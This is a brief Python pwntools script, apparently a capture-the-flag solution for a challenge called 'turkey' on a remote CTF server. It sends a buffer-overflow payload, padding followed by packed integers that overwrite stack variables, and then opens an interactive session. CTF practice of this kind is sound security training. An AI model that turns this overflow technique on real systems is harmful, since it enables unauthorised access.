from pwn import *

#p=process("turkey")
p=remote("challenges.auctf.com",30011)

payload="AAAABBBBCCCCDDDD"
payload+=p32(0x2a)
payload+=p32(0x15)
payload+=p32(0x667463)
payload+=p32(0xffffffea)
payload+=p32(0x1337)
p.sendline(payload)
p.interactive()













